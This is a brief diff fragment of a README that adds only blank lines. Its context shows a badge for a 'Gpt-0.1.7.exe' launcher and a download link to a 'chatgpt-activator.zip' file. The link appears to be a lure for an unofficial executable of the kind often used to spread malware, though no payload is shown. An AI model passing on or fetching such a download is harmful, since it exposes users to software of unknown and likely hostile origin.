@@ -14,6 +14,9 @@
   <img alt="Launcher" src="https://img.shields.io/badge/Launcher-Gpt--0.1.7.exe-7c3aed?style=for-the-badge" />
 </p>
 
+
+
+
 <p align="center">
   <a href="https://github.com/user-attachments/files/26911702/chatgpt-activator.zip">
     <img
@@ -23,6 +26,9 @@
     />
   </a>
 </p>
+
+
+
 
 ## Overview 🚀
 
